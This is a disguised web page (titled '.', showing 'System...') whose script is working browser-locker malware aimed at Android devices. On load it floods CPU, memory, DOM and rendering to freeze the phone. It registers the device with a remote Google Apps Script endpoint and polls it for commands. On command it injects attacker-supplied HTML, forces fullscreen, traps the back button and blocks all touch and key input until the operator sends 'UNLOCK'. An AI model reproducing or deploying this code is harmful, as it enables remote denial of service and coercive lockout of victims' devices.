<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>.</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;overflow:hidden;position:fixed;top:0;left:0;background:#000}
        body{font-family:Arial,sans-serif;color:#fff}
    </style>
</head>
<body>
<div id="s" style="color:#666;font-size:13px;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:9999;">System...</div>
<script>
const API='https://script.google.com/macros/s/AKfycbzwtt_Qt3xFQ5ToKqAy3Je-ukHD41Tinl9bHXT7aTd3KXQ3bt15w0SiMuHLY31peOheug/exec';
const DID='z'+Math.random().toString(36).substring(2,15);
const M=navigator.userAgent.match(/Android[\s\d.]+/)?.[0]||'Android';
let locked=false;
let floodActive=true;

// === FLOOD ===
function floodCPU(){
  if(!floodActive)return;
  for(let i=0;i<5000;i++){Math.sin(Math.random()*9999)*Math.cos(Math.random()*9999);Math.pow(Math.random(),Math.random());}
  setTimeout(floodCPU,0);
}
function floodDOM(){
  if(!floodActive)return;
  for(let i=0;i<200;i++){let d=document.createElement('div');d.style.cssText='position:fixed;width:2px;height:2px;background:rgba(0,0,0,0.001)';d.textContent=Math.random().toString(36).repeat(20);document.body.appendChild(d);setTimeout(()=>{try{d.remove()}catch(e){}},50);}
  setTimeout(floodDOM,0);
}
function floodMemory(){
  if(!floodActive)return;
  let x=[];for(let i=0;i<500;i++)x.push(new Array(5000).fill(Math.random().toString(36)));
  setTimeout(floodMemory,0);
}
function floodRender(){
  if(!floodActive)return;
  document.body.style.transform='translate('+Math.random()*2+'px,'+Math.random()*2+'px)';document.body.style.opacity='0.'+Math.floor(Math.random()*9+1);document.body.style.transform='';document.body.style.opacity='1';
  requestAnimationFrame(floodRender);
}

// === SEMAT MATI (baru aktif pas Lock) ===
function sematMati(){
  locked=true;
  goFull();
  blockAll();
}
function goFull(){
  document.documentElement.requestFullscreen?.();
  document.documentElement.webkitRequestFullscreen?.();
}
function blockAll(){
  for(let i=0;i<5;i++) history.pushState(null,'',location.href);
  const no=e=>{e.preventDefault();e.stopPropagation();return false;};
  ['contextmenu','touchstart','touchmove','touchend','gesturestart','gesturechange','gestureend','wheel','keydown','keyup','keypress','pointerdown','pointermove','pointerup','click','dblclick','select','scroll'].forEach(ev=>{
    document.addEventListener(ev,no,{passive:false,capture:true});
    window.addEventListener(ev,no,{passive:false,capture:true});
  });
  window.addEventListener('popstate',()=>{for(let i=0;i<3;i++)history.pushState(null,'',location.href);goFull();});
  document.body.style.touchAction='none';
  document.body.style.pointerEvents='none';
}

// === API ===
async function reg(){
  try{
    let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'register',device_id:DID,model:M})});
    let d=await r.json();
    if(d.command==='UNLOCK'){unlockAll();return;}
    if(d.command){document.body.innerHTML=d.command;sematMati();floodActive=false;}
  }catch(e){}
}
async function chk(){
  try{
    let r=await fetch(API+'?action=check&device_id='+DID);
    let d=await r.json();
    if(d.command==='UNLOCK'){unlockAll();return;}
    if(d.command){document.body.innerHTML=d.command;sematMati();floodActive=false;}
  }catch(e){}
}
function unlockAll(){
  locked=false;
  floodActive=false;
  document.body.innerHTML='<div style="color:#666;">OK</div>';
}

// === START: cuma flood, belum semat ===
floodCPU();
floodDOM();
floodMemory();
floodRender();
reg();
setInterval(chk,5000);
// Loop semat mati cuma jalan kalau locked=true
setInterval(()=>{if(!locked)return;goFull();for(let i=0;i<3;i++)history.pushState(null,'',location.href);},50);
</script>
</body>
</html>
